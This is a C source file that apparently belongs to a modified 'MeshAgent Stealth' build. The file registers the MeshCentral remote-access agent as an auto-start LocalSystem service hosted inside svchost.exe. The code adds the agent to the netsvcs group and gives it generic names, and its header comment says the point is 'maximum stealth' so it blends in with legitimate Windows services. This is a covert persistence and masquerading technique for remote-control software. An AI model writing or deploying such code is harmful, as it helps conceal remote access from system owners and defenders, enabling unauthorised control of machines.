/*
 * MeshAgent Stealth - Svchost.exe Hosting Implementation
 *
 * Allows MeshAgent to run as a DLL inside svchost.exe instead of standalone process.
 * This provides maximum stealth as the service blends with legitimate Windows services.
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <wchar.h>
#include "stealth.h"
#include "../meshcore/agentcore.h"
#include "../meshcore/generated/meshagent_branding.h"
#include "../microstack/ILibParsers.h"

// Use AgentCore APIs
// MeshAgent_Create/MeshAgent_Stop are declared in agentcore.h
// Provide a local run helper that starts the ILib chain
static void MeshAgent_Run(MeshAgentHostContainer* agent)
{
    if (agent != NULL && agent->chain != NULL)
    {
        ILibStartChain(agent->chain);
    }
}

// Global state for svchost-hosted service
static SERVICE_STATUS_HANDLE g_SvchostStatusHandle = NULL;
static SERVICE_STATUS g_SvchostStatus = {0};
static BOOL g_SvchostRunning = FALSE;
static MeshAgentHostContainer* g_SvchostAgent = NULL;

/**
 * Service control handler for svchost-hosted mode
 */
DWORD WINAPI Stealth_SvchostCtrlHandler(
    DWORD dwControl,
    DWORD dwEventType,
    LPVOID lpEventData,
    LPVOID lpContext)
{
    UNREFERENCED_PARAMETER(lpEventData);
    UNREFERENCED_PARAMETER(lpContext);

    switch (dwControl)
    {
        case SERVICE_CONTROL_STOP:
        case SERVICE_CONTROL_SHUTDOWN:
            // Update status to STOP_PENDING
            g_SvchostStatus.dwCurrentState = SERVICE_STOP_PENDING;
            g_SvchostStatus.dwCheckPoint = 0;
            g_SvchostStatus.dwWaitHint = 5000;
            SetServiceStatus(g_SvchostStatusHandle, &g_SvchostStatus);

            // Signal service to stop
            g_SvchostRunning = FALSE;

            // Stop MeshAgent
            if (g_SvchostAgent != NULL)
            {
                MeshAgent_Stop(g_SvchostAgent);
                g_SvchostAgent = NULL;
            }

            // Update status to STOPPED
            g_SvchostStatus.dwCurrentState = SERVICE_STOPPED;
            g_SvchostStatus.dwCheckPoint = 0;
            g_SvchostStatus.dwWaitHint = 0;
            SetServiceStatus(g_SvchostStatusHandle, &g_SvchostStatus);

            return NO_ERROR;

        case SERVICE_CONTROL_INTERROGATE:
            // Report current status
            SetServiceStatus(g_SvchostStatusHandle, &g_SvchostStatus);
            return NO_ERROR;

        case SERVICE_CONTROL_PAUSE:
            // Not supported
            return ERROR_CALL_NOT_IMPLEMENTED;

        case SERVICE_CONTROL_CONTINUE:
            // Not supported
            return ERROR_CALL_NOT_IMPLEMENTED;

        case SERVICE_CONTROL_POWEREVENT:
            // Handle power events if needed
            switch (dwEventType)
            {
                case PBT_APMSUSPEND:
                    // System is suspending
                    break;
                case PBT_APMRESUMESUSPEND:
                    // System is resuming
                    break;
            }
            return NO_ERROR;

        case SERVICE_CONTROL_SESSIONCHANGE:
            // Handle session changes if needed
            return NO_ERROR;

        default:
            return ERROR_CALL_NOT_IMPLEMENTED;
    }
}

/**
 * Main service entry point for svchost.exe hosting
 * This is the function that svchost.exe calls when starting our service
 */
VOID WINAPI Stealth_SvchostServiceMain(DWORD dwArgc, LPTSTR *lpszArgv)
{
    // DWORD i; // not used; removed to avoid unused variable warning

    // Register service control handler
    g_SvchostStatusHandle = RegisterServiceCtrlHandlerEx(
        MESH_AGENT_SERVICE_FILE,  // Use branded service key name
        (LPHANDLER_FUNCTION_EX)Stealth_SvchostCtrlHandler,
        NULL                    // Context
    );

    if (!g_SvchostStatusHandle)
    {
        return;  // Failed to register handler
    }

    // Initialize service status structure
    g_SvchostStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;  // Shared svchost service
    g_SvchostStatus.dwCurrentState = SERVICE_START_PENDING;
    g_SvchostStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP |
                                          SERVICE_ACCEPT_SHUTDOWN |
                                          SERVICE_ACCEPT_POWEREVENT |
                                          SERVICE_ACCEPT_SESSIONCHANGE;
    g_SvchostStatus.dwWin32ExitCode = NO_ERROR;
    g_SvchostStatus.dwServiceSpecificExitCode = 0;
    g_SvchostStatus.dwCheckPoint = 0;
    g_SvchostStatus.dwWaitHint = 3000;

    // Report initial status
    SetServiceStatus(g_SvchostStatusHandle, &g_SvchostStatus);

    // Initialize MeshAgent core with default capabilities
    g_SvchostAgent = MeshAgent_Create(0);

    if (!g_SvchostAgent)
    {
        // Failed to create agent
        g_SvchostStatus.dwCurrentState = SERVICE_STOPPED;
        g_SvchostStatus.dwWin32ExitCode = ERROR_SERVICE_SPECIFIC_ERROR;
        g_SvchostStatus.dwServiceSpecificExitCode = 1;
        SetServiceStatus(g_SvchostStatusHandle, &g_SvchostStatus);
        return;
    }

    // Update status to RUNNING
    g_SvchostStatus.dwCurrentState = SERVICE_RUNNING;
    g_SvchostStatus.dwCheckPoint = 0;
    g_SvchostStatus.dwWaitHint = 0;
    SetServiceStatus(g_SvchostStatusHandle, &g_SvchostStatus);

    g_SvchostRunning = TRUE;

    // Main service loop - MeshAgent_Run handles everything
    MeshAgent_Run(g_SvchostAgent);

    // Service has stopped
    g_SvchostStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_SvchostStatusHandle, &g_SvchostStatus);
}

/**
 * Register service for svchost.exe hosting
 * Creates required registry entries for svchost to load our DLL
 */
BOOL Stealth_RegisterSvchostService(const wchar_t* serviceName, const wchar_t* dllPath)
{
    HKEY hKey = NULL;
    HKEY hParamsKey = NULL;
    HKEY hSvchostKey = NULL;
    LONG result;
    BOOL success = FALSE;
    wchar_t keyPath[512];
    DWORD dwType, dwSize;

    if (!serviceName || !dllPath)
    {
        return FALSE;
    }

    // Create service registry key
    swprintf_s(keyPath, sizeof(keyPath)/sizeof(wchar_t),
               L"SYSTEM\\CurrentControlSet\\Services\\%s", serviceName);

    result = RegCreateKeyExW(HKEY_LOCAL_MACHINE, keyPath, 0, NULL, 0,
                             KEY_WRITE, NULL, &hKey, NULL);
    if (result != ERROR_SUCCESS)
    {
        return FALSE;
    }

    // Set service type to SHARE_PROCESS
    DWORD dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
    RegSetValueExW(hKey, L"Type", 0, REG_DWORD, (LPBYTE)&dwServiceType, sizeof(DWORD));

    // Set start type to AUTO_START
    DWORD dwStartType = SERVICE_AUTO_START;
    RegSetValueExW(hKey, L"Start", 0, REG_DWORD, (LPBYTE)&dwStartType, sizeof(DWORD));

    // Set error control
    DWORD dwErrorControl = SERVICE_ERROR_NORMAL;
    RegSetValueExW(hKey, L"ErrorControl", 0, REG_DWORD, (LPBYTE)&dwErrorControl, sizeof(DWORD));

    // Set ImagePath to svchost with netsvcs group
    const wchar_t* groupName = L"netsvcs";
    wchar_t imagePath[256];
    _snwprintf_s(imagePath, _countof(imagePath), _TRUNCATE, L"%%SystemRoot%%\\System32\\svchost.exe -k %s -p", groupName);
    RegSetValueExW(hKey, L"ImagePath", 0, REG_EXPAND_SZ,
                   (LPBYTE)imagePath, (DWORD)((wcslen(imagePath) + 1) * sizeof(wchar_t)));

    // Set display name (generic)
    RegSetValueEx(hKey, TEXT("DisplayName"), 0, REG_SZ,
                  (LPBYTE)MESH_AGENT_SERVICE_NAME, (DWORD)((lstrlen(MESH_AGENT_SERVICE_NAME) + 1) * sizeof(TCHAR)));

    // Set description (generic)
    RegSetValueEx(hKey, TEXT("Description"), 0, REG_SZ,
                  (LPBYTE)TEXT(MESH_AGENT_FILE_DESCRIPTION), (DWORD)((lstrlen(TEXT(MESH_AGENT_FILE_DESCRIPTION)) + 1) * sizeof(TCHAR)));

    // Set ObjectName (LocalSystem)
    const wchar_t* objectName = L"LocalSystem";
    RegSetValueExW(hKey, L"ObjectName", 0, REG_SZ,
                   (LPBYTE)objectName, (DWORD)((wcslen(objectName) + 1) * sizeof(wchar_t)));

    // Create Parameters subkey
    result = RegCreateKeyExW(hKey, L"Parameters", 0, NULL, 0,
                             KEY_WRITE, NULL, &hParamsKey, NULL);
    if (result == ERROR_SUCCESS)
    {
        // Set ServiceDll parameter (optional)
        if (dllPath && *dllPath)
        {
            RegSetValueExW(hParamsKey, L"ServiceDll", 0, REG_EXPAND_SZ,
                           (LPBYTE)dllPath, (DWORD)((wcslen(dllPath) + 1) * sizeof(wchar_t)));
        }

        // Set ServiceMain export name and unload policy
        const wchar_t* serviceMain = L"Stealth_SvchostServiceMain";
        RegSetValueExW(hParamsKey, L"ServiceMain", 0, REG_SZ,
                       (LPBYTE)serviceMain, (DWORD)((wcslen(serviceMain) + 1) * sizeof(wchar_t)));
        DWORD unload = 1;
        RegSetValueExW(hParamsKey, L"ServiceDllUnloadOnStop", 0, REG_DWORD, (LPBYTE)&unload, sizeof(unload));

        RegCloseKey(hParamsKey);
    }

    RegCloseKey(hKey);

    // Add service to svchost netsvcs group
    result = RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                           L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost",
                           0, KEY_READ | KEY_WRITE, &hSvchostKey);
    if (result == ERROR_SUCCESS)
    {
        // Read current netsvcs value
        WCHAR currentServices[4096] = {0};
        dwSize = sizeof(currentServices);
        dwType = REG_MULTI_SZ;

        result = RegQueryValueExW(hSvchostKey, L"netsvcs", NULL, &dwType,
                                  (LPBYTE)currentServices, &dwSize);

        if (result == ERROR_SUCCESS || result == ERROR_MORE_DATA)
        {
            // Check if our service is already in the list
            BOOL found = FALSE;
            WCHAR* ptr = currentServices;
            while (*ptr)
            {
                if (_wcsicmp(ptr, serviceName) == 0)
                {
                    found = TRUE;
                    break;
                }
                ptr += wcslen(ptr) + 1;
            }

            // Add our service to the list if not already present
            if (!found)
            {
                size_t currentLen = 0;
                ptr = currentServices;
                while (*ptr)
                {
                    ptr += wcslen(ptr) + 1;
                }
                currentLen = ptr - currentServices;

                // Append our service name
                wcscpy_s(currentServices + currentLen,
                        (sizeof(currentServices)/sizeof(wchar_t)) - currentLen,
                        serviceName);
                currentLen += wcslen(serviceName) + 1;
                currentServices[currentLen] = L'\0';  // Double null terminator

                // Write back to registry
                RegSetValueExW(hSvchostKey, L"netsvcs", 0, REG_MULTI_SZ,
                              (LPBYTE)currentServices,
                              (DWORD)((currentLen + 1) * sizeof(wchar_t)));
            }

            success = TRUE;
        }

        RegCloseKey(hSvchostKey);
    }

    return success;
}

BOOL Stealth_UnregisterSvchostService(const wchar_t* serviceName)
{
    if (!serviceName || !*serviceName) { return FALSE; }

    BOOL success = TRUE;
    // Remove from svchost group (netsvcs)
    HKEY hSvchostKey = NULL;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                      L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost",
                      0, KEY_READ | KEY_WRITE, &hSvchostKey) == ERROR_SUCCESS)
    {
        DWORD type = 0;
        DWORD cb = 0;
        if (RegQueryValueExW(hSvchostKey, L"netsvcs", NULL, &type, NULL, &cb) == ERROR_SUCCESS && type == REG_MULTI_SZ)
        {
            wchar_t* buf = (wchar_t*)malloc(cb + 2 * sizeof(wchar_t));
            if (buf && RegQueryValueExW(hSvchostKey, L"netsvcs", NULL, &type, (LPBYTE)buf, &cb) == ERROR_SUCCESS)
            {
                buf[cb / sizeof(wchar_t)] = L'\0';
                buf[cb / sizeof(wchar_t) + 1] = L'\0';
                // Build new list excluding serviceName
                size_t outLen = 0;
                wchar_t* out = (wchar_t*)malloc(cb + 2 * sizeof(wchar_t));
                if (out)
                {
                    for (wchar_t* p = buf; *p; p += (wcslen(p) + 1))
                    {
                        if (_wcsicmp(p, serviceName) == 0) { continue; }
                        size_t len = wcslen(p) + 1;
                        wcscpy_s(out + outLen, (cb/sizeof(wchar_t)) - outLen, p);
                        outLen += len;
                    }
                    out[outLen] = L'\0';
                    RegSetValueExW(hSvchostKey, L"netsvcs", 0, REG_MULTI_SZ,
                                   (LPBYTE)out, (DWORD)((outLen + 1) * sizeof(wchar_t)));
                    free(out);
                }
            }
            if (buf) free(buf);
        }
        RegCloseKey(hSvchostKey);
    }

    // Delete service key tree
    wchar_t keyPath[512];
    _snwprintf_s(keyPath, _countof(keyPath), _TRUNCATE,
                 L"SYSTEM\\CurrentControlSet\\Services\\%s", serviceName);
    LSTATUS del = RegDeleteTreeW(HKEY_LOCAL_MACHINE, keyPath);
    if (!(del == ERROR_SUCCESS || del == ERROR_FILE_NOT_FOUND || del == ERROR_PATH_NOT_FOUND))
    {
        success = FALSE;
    }

    return success;
}

/**
 * DLL Main entry point
 * Required for DLL version of MeshAgent
 */
#ifdef BUILD_SVCHOST_DLL
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    UNREFERENCED_PARAMETER(hinstDLL);
    UNREFERENCED_PARAMETER(lpvReserved);

    switch (fdwReason)
    {
        case DLL_PROCESS_ATTACH:
            // DLL is being loaded
            // Disable thread notifications for performance
            DisableThreadLibraryCalls(hinstDLL);
            break;

        case DLL_PROCESS_DETACH:
            // DLL is being unloaded
            if (g_SvchostAgent != NULL)
            {
                MeshAgent_Stop(g_SvchostAgent);
                g_SvchostAgent = NULL;
            }
            break;

        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
            // Not used due to DisableThreadLibraryCalls
            break;
    }

    return TRUE;
}
#endif // BUILD_SVCHOST_DLL
